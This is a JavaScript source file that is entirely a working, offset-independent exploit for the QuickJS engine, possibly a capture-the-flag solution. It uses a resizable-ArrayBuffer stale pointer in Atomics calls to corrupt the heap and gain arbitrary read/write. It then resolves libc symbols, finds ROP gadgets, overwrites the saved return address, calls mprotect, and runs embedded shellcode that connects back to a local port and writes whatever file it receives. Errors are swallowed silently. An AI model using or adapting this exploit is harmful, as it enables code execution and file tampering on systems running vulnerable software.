'use strict';

// Offset-independent QuickJS exploit: Atomics + Resizable ArrayBuffer stale pointer
// -> heap corruption -> arbitrary read/write -> ret2ROP -> mprotect -> shellcode.
//
// connectback primitive:
// 1) connect to 127.0.0.1:9999
// 2) recv <u32 fnlen><fn><u32 clen><content>
// 3) write content to fn
//
// Offset-independence:
// - libc base found by scanning for ELF magic from a libc pointer leak
// - libc symbols resolved by parsing in-memory ELF dynamic tables
// - gadgets found by scanning libc executable segment for byte patterns

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }

// ------------------------ vuln primitives ------------------------
function leak_libc_ptr_once() {
  // Ensure the post-shrink remainder is not merged into the top chunk by
  // allocating a same-size "guard" chunk after the RAB.
  const L1 = 0x3000;
  const L2 = 0x20;

  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let guard = new ArrayBuffer(L1);
  let ta = new BigInt64Array(rab);

  let evil = {
    guard,
    valueOf() {
      rab.resize(L2);
      return 0n;
    }
  };

  // index 6 -> byte offset 0x30, which lands on unsorted-bin fd when the shrink splits.
  return u64(Atomics.add(ta, 6, evil));
}

function make_arb_u64_view(base_addr, bytes) {
  // Corrupt a BigUint64Array's internal data pointer to base_addr.
  let backing = new ArrayBuffer(bytes);
  let victim = null;

  const L1 = 0x70;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);

  // Small heap spray for reliability.
  let spray = [];
  for (let i = 0; i < 80; i++) spray.push(new ArrayBuffer(0x40));

  let evil = {
    spray,
    valueOf() {
      rab.resize(L2);
      victim = new BigUint64Array(backing);
      return base_addr;
    }
  };

  // stale ptr write at 13*8 = 0x68
  Atomics.store(ta, 13, evil);

  if (victim === null)
    throw new Error('failed to create corrupted view');
  return { victim, base: (base_addr & ~7n), bytes };
}

// ------------------------ arbitrary memory helpers ------------------------
function rd64(mem, addr) {
  let idx = Number((addr - mem.base) >> 3n);
  return u64(mem.victim[idx]);
}
function wr64(mem, addr, val) {
  let idx = Number((addr - mem.base) >> 3n);
  mem.victim[idx] = u64(val);
}
function rdN(mem, addr, nBytes) {
  let a = addr & ~7n;
  let shift = Number((addr - a) * 8n);
  let w = rd64(mem, a);
  let mask = (1n << BigInt(nBytes * 8)) - 1n;
  return (w >> BigInt(shift)) & mask;
}
function rd8(mem, addr) { return Number(rdN(mem, addr, 1)); }
function rd16(mem, addr) { return Number(rdN(mem, addr, 2)); }
function rd32(mem, addr) { return Number(rdN(mem, addr, 4)); }

function readCString(mem, addr, maxLen) {
  let s = '';
  for (let i = 0; i < maxLen; i++) {
    let c = rd8(mem, addr + BigInt(i));
    if (c === 0) break;
    s += String.fromCharCode(c);
  }
  return s;
}

function make_view_retry(base, bytes, checkAddr, check32) {
  for (let attempt = 0; attempt < 30; attempt++) {
    let mem = make_arb_u64_view(base, bytes);
    if (checkAddr !== null) {
      if (rd32(mem, checkAddr) !== check32) continue;
    }
    return mem;
  }
  throw new Error('failed to build memory view');
}

function isLikelyLibPtr(x) {
  // typical shared lib mapping: 0x00007f??........
  let hi = x >> 40n;
  return (hi === 0x7fn);
}

// ------------------------ find libc base ------------------------
function find_elf_base_from_ptr(leakPtr) {
  const ELF_MAGIC = 0x464c457f;
  let page = leakPtr & ~0xfffn;
  const SCAN = 0x400000;
  let start = (page - BigInt(SCAN)) & ~7n;
  for (let attempt = 0; attempt < 30; attempt++) {
    let mem = make_arb_u64_view(start, SCAN + 0x2000);
    for (let off = SCAN; off >= 0; off -= 0x1000) {
      let cand = (start + BigInt(off)) & ~0xfffn;
      if (rd32(mem, cand) === ELF_MAGIC)
        return cand;
    }
  }
  return 0n;
}

// ------------------------ ELF parsing (dynamic symbols) ------------------------
const PT_LOAD = 1;
const PT_DYNAMIC = 2;
const PF_X = 1;

const DT_HASH = 4;
const DT_STRTAB = 5;
const DT_SYMTAB = 6;
const DT_SYMENT = 11;

function parse_program_headers(mem, elfBase) {
  let e_phoff = rd64(mem, elfBase + 0x20n);
  let e_phentsize = rd16(mem, elfBase + 0x36n);
  let e_phnum = rd16(mem, elfBase + 0x38n);

  let dynamicAddr = 0n;
  let execSeg = { start: 0n, end: 0n };

  for (let i = 0; i < e_phnum; i++) {
    let ph = elfBase + e_phoff + BigInt(i * e_phentsize);
    let p_type = rd32(mem, ph + 0n);
    let p_flags = rd32(mem, ph + 4n);
    let p_vaddr = rd64(mem, ph + 16n);
    let p_memsz = rd64(mem, ph + 40n);

    if (p_type === PT_DYNAMIC) dynamicAddr = elfBase + p_vaddr;
    if (p_type === PT_LOAD && (p_flags & PF_X)) {
      execSeg.start = elfBase + p_vaddr;
      execSeg.end = execSeg.start + p_memsz;
    }
  }

  if (dynamicAddr === 0n) throw new Error('PT_DYNAMIC not found');
  if (execSeg.start === 0n) throw new Error('exec PT_LOAD not found');
  return { dynamicAddr, execSeg };
}

function parse_dynamic_tags(mem, dynamicAddr) {
  let tags = Object.create(null);
  for (let off = 0n;; off += 16n) {
    let tag = rd64(mem, dynamicAddr + off);
    let val = rd64(mem, dynamicAddr + off + 8n);
    if (tag === 0n) break;
    tags[tag.toString()] = val;
  }
  return tags;
}

function dyn_get(tags, tagConst) {
  let k = tagConst.toString();
  return (k in tags) ? tags[k] : 0n;
}

function resolve_dynsym(mem, elfBase, tags, name) {
  let symtab = dyn_get(tags, DT_SYMTAB);
  let strtab = dyn_get(tags, DT_STRTAB);
  let syment = Number(dyn_get(tags, DT_SYMENT));
  let hash = dyn_get(tags, DT_HASH);
  if (!symtab || !strtab || !syment || !hash)
    throw new Error('missing dynamic symtab/strtab/hash');

  let nchain = rd32(mem, hash + 4n);
  for (let i = 0; i < nchain; i++) {
    let ent = symtab + BigInt(i * syment);
    let st_name = rd32(mem, ent + 0n);
    if (st_name === 0) continue;
    let symName = readCString(mem, strtab + BigInt(st_name), 96);
    if (symName === name) {
      let st_value = rd64(mem, ent + 8n);
      let st_size = rd64(mem, ent + 16n);
      return { addr: elfBase + st_value, size: st_size };
    }
  }
  return null;
}

// ------------------------ gadget finding (scan libc text) ------------------------
function findGadget2(mem, start, end, b0, b1) {
  let pat = (BigInt(b0) | (BigInt(b1) << 8n)) & 0xffffn;
  let a0 = start & ~7n;
  for (let a = a0; a + 16n < end; a += 8n) {
    let w = rd64(mem, a);
    for (let sh = 0; sh <= 6; sh++) {
      if (((w >> BigInt(sh * 8)) & 0xffffn) === pat)
        return a + BigInt(sh);
    }
    let w2 = rd64(mem, a + 8n);
    if (((w >> 56n) & 0xffn) === BigInt(b0) && (w2 & 0xffn) === BigInt(b1))
      return a + 7n;
  }
  return 0n;
}

function findGadget3(mem, start, end, b0, b1, b2) {
  let pat = (BigInt(b0) | (BigInt(b1) << 8n) | (BigInt(b2) << 16n)) & 0xffffffn;
  let a0 = start & ~7n;
  for (let a = a0; a + 24n < end; a += 8n) {
    let w = rd64(mem, a);
    for (let sh = 0; sh <= 5; sh++) {
      if (((w >> BigInt(sh * 8)) & 0xffffffn) === pat)
        return a + BigInt(sh);
    }
    let w2 = rd64(mem, a + 8n);
    if (((w >> 48n) & 0xffffn) === (BigInt(b0) | (BigInt(b1) << 8n)) && (w2 & 0xffn) === BigInt(b2))
      return a + 6n;
    if (((w >> 56n) & 0xffn) === BigInt(b0) && (w2 & 0xffffn) === (BigInt(b1) | (BigInt(b2) << 8n)))
      return a + 7n;
  }
  return 0n;
}

function findRet(mem, start, end) {
  let a0 = start & ~7n;
  for (let a = a0; a + 8n < end; a += 8n) {
    let w = rd64(mem, a);
    for (let sh = 0; sh < 8; sh++) {
      if (((w >> BigInt(sh * 8)) & 0xffn) === 0xc3n)
        return a + BigInt(sh);
    }
  }
  return 0n;
}

// ------------------------ locate main-return slot on stack ------------------------
function readS32(mem, addr) {
  let v = rd32(mem, addr) >>> 0;
  if (v & 0x80000000) return v - 0x100000000;
  return v;
}

function find_call_targets(mem, fnAddr, fnSize, execStart, execEnd) {
  let max = Number(fnSize);
  if (max <= 0 || max > 0x8000) max = 0x1000;
  let tgts = [];
  for (let i = 0; i < max - 5; i++) {
    if (rd8(mem, fnAddr + BigInt(i)) !== 0xe8) continue;
    let rel = readS32(mem, fnAddr + BigInt(i + 1));
    let next = fnAddr + BigInt(i + 5);
    let tgt = next + BigInt(rel);
    if (tgt >= execStart && tgt < execEnd) tgts.push(tgt);
  }
  // de-dup
  let uniq = [];
  for (let i = 0; i < tgts.length; i++) {
    let ok = true;
    for (let j = 0; j < uniq.length; j++) {
      if (uniq[j] === tgts[i]) { ok = false; break; }
    }
    if (ok) uniq.push(tgts[i]);
  }
  return uniq;
}

function find_call_reg_retsites(mem, fnAddr, maxBytes) {
  let sites = [];
  for (let i = 0; i < maxBytes - 3; i++) {
    let b0 = rd8(mem, fnAddr + BigInt(i));
    if (b0 === 0xff) {
      let modrm = rd8(mem, fnAddr + BigInt(i + 1));
      if ((modrm & 0xF8) === 0xD0)
        sites.push(fnAddr + BigInt(i + 2));
    }
    if (b0 >= 0x40 && b0 <= 0x4f) {
      let b1 = rd8(mem, fnAddr + BigInt(i + 1));
      if (b1 === 0xff) {
        let modrm = rd8(mem, fnAddr + BigInt(i + 2));
        if ((modrm & 0xF8) === 0xD0)
          sites.push(fnAddr + BigInt(i + 3));
      }
    }
  }
  // de-dup
  let uniq = [];
  for (let i = 0; i < sites.length; i++) {
    let ok = true;
    for (let j = 0; j < uniq.length; j++) {
      if (uniq[j] === sites[i]) { ok = false; break; }
    }
    if (ok) uniq.push(sites[i]);
  }
  return uniq;
}

function findSavedRIPIndex(stackView, candidates) {
  let n = stackView.bytes >> 3;
  for (let i = n - 1; i >= 0; i--) {
    let v = stackView.victim[i];
    for (let j = 0; j < candidates.length; j++) {
      if (v === candidates[j]) return i;
    }
  }
  return -1;
}

// ------------------------ shellcode (syscalls) ------------------------
const SHELLCODE_HEX =
  "4881ec001000004989e4b829000000bf02000000be0100000031d20f054989c5498db4240002000066c706020066c74602270fc746047f00000148c74608000000004489efb82a000000ba100000000f054d8d0c2441b80400000031c04489ef4c89ce4489c20f054885c00f8ee20000004901c14129c075e2458b34244d8d4c24044589f04585c0741e31c04489ef4c89ce4489c20f054885c00f8eb30000004901c14129c0ebdd43c644340400498d5c24044c01f34883c3014c8d0b41b80400000031c04489ef4c89ce4489c20f054885c07e7e4901c14129c075e6448b3b4c8d4b044589f84585c0741a31c04489ef4c89ce4489c20f054885c07e554901c14129c0ebe1b801010000bf9cffffff498d742404ba4102000041baa40100000f054989c6b8010000004489f7488d73044489fa0f05b8030000004489f70f05b8030000004489ef0f0531ffb83c0000000f05bf01000000b83c0000000f05";

function hexToBytes(hex) {
  let out = new Array(hex.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(hex.substr(i * 2, 2), 16);
  }
  return out;
}

function writeBytes(mem, addr, bytes) {
  for (let i = 0; i < bytes.length; i += 8) {
    let w = 0n;
    for (let j = 0; j < 8 && (i + j) < bytes.length; j++) {
      w |= BigInt(bytes[i + j]) << BigInt(j * 8);
    }
    wr64(mem, addr + BigInt(i), w);
  }
}

// ------------------------ exploit ------------------------
function pwn() {
  // Leak libc base robustly.
  let libcBase = 0n;
  for (let attempt = 0; attempt < 30; attempt++) {
    let leak = leak_libc_ptr_once();
    if (!isLikelyLibPtr(leak)) continue;
    libcBase = find_elf_base_from_ptr(leak);
    if (libcBase !== 0n) break;
  }
  if (libcBase === 0n) return;

  // libc view for parsing + scanning
  let libcMem = make_view_retry(libcBase, 0x800000, libcBase, 0x464c457f);
  let ph = parse_program_headers(libcMem, libcBase);
  let tags = parse_dynamic_tags(libcMem, ph.dynamicAddr);

  let environSym = resolve_dynsym(libcMem, libcBase, tags, 'environ');
  let mprotectSym = resolve_dynsym(libcMem, libcBase, tags, 'mprotect');
  let startMainSym = resolve_dynsym(libcMem, libcBase, tags, '__libc_start_main');
  if (!environSym || !mprotectSym || !startMainSym) return;

  // gadgets
  let execStart = ph.execSeg.start, execEnd = ph.execSeg.end;
  let retG = findRet(libcMem, execStart, execEnd);
  let popRdi = findGadget2(libcMem, execStart, execEnd, 0x5f, 0xc3);
  let popRsi = findGadget2(libcMem, execStart, execEnd, 0x5e, 0xc3);
  let popRdx = findGadget2(libcMem, execStart, execEnd, 0x5a, 0xc3);
  let popRdxRbx = (popRdx !== 0n) ? 0n : findGadget3(libcMem, execStart, execEnd, 0x5a, 0x5b, 0xc3);
  if (!retG || !popRdi || !popRsi || (!popRdx && !popRdxRbx)) return;

  // Return-site candidates: harvest from call targets of __libc_start_main.
  let callTargets = find_call_targets(libcMem, startMainSym.addr, startMainSym.size, execStart, execEnd);
  let retSites = [];
  for (let i = 0; i < callTargets.length; i++) {
    let sites = find_call_reg_retsites(libcMem, callTargets[i], 0x1000);
    for (let j = 0; j < sites.length; j++) retSites.push(sites[j]);
  }
  // Also include call-reg sites in __libc_start_main itself.
  let directSites = find_call_reg_retsites(libcMem, startMainSym.addr, (Number(startMainSym.size) < 0x800 ? 0x800 : Number(startMainSym.size)));
  for (let j = 0; j < directSites.length; j++) retSites.push(directSites[j]);
  if (retSites.length === 0) return;

  // Stack view near environ (small window) and locate the saved RIP slot.
  let envPtr = rd64(libcMem, environSym.addr);

  let stackTop = null;
  let rip_i = -1;
  let topBase = 0n;
  let topBytes = 0;

  let scanSizes = [0x20000, 0x40000, 0x80000];
  for (let s = 0; s < scanSizes.length; s++) {
    topBytes = scanSizes[s];
    topBase = (envPtr - BigInt(topBytes)) & ~7n;
    // Create view and sanity-check that it reads non-zero pointers at envPtr.
    for (let attempt = 0; attempt < 20; attempt++) {
      stackTop = make_arb_u64_view(topBase, topBytes);
      let v = rd64(stackTop, (envPtr - 0x10n) & ~7n);
      if (v !== 0n) break;
      stackTop = null;
    }
    if (!stackTop) continue;

    rip_i = findSavedRIPIndex(stackTop, retSites);
    if (rip_i >= 0) break;
  }
  if (!stackTop || rip_i < 0) return;

  // Write shellcode lower on the stack, then ROP: mprotect(sc_page, 0x2000, RWX) -> sc_addr
  const CODE_DELTA = 0x80000n; // 512KB below environ
  let sc_page = (envPtr - CODE_DELTA) & ~0xfffn;
  let sc_addr = sc_page + 0x800n;

  let codeView = make_view_retry(sc_page & ~7n, 0x4000, null, 0);
  writeBytes(codeView, sc_addr, hexToBytes(SHELLCODE_HEX));

  let chain = [];
  chain.push(retG);
  chain.push(popRdi); chain.push(sc_page);
  chain.push(popRsi); chain.push(0x2000n);
  if (popRdx !== 0n) {
    chain.push(popRdx); chain.push(7n);
  } else {
    chain.push(popRdxRbx); chain.push(7n); chain.push(0n);
  }
  chain.push(mprotectSym.addr);
  chain.push(sc_addr);

  if (rip_i + chain.length >= stackTop.victim.length) return;

  for (let j = 0; j < chain.length; j++) {
    stackTop.victim[rip_i + j] = u64(chain[j]);
  }
}

try {
  pwn();
} catch (e) {
  // silent
}
